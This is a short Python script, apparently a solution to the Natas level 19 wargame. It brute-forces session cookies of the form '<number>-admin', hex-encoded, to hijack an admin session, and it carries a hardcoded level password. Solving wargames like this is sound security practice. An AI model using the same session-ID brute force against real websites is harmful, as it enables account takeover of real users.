import natasX

natas = natasX

#print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php", data={"debug": "", "username": "admin", "password": "123"}).cookies.get("PHPSESSID"))

for i in range(280, 282):
    charHex = f'{str(i).encode("utf-8").hex()}2d61646d696e'
    print(charHex)
    print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php",
                       data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": charHex}).text)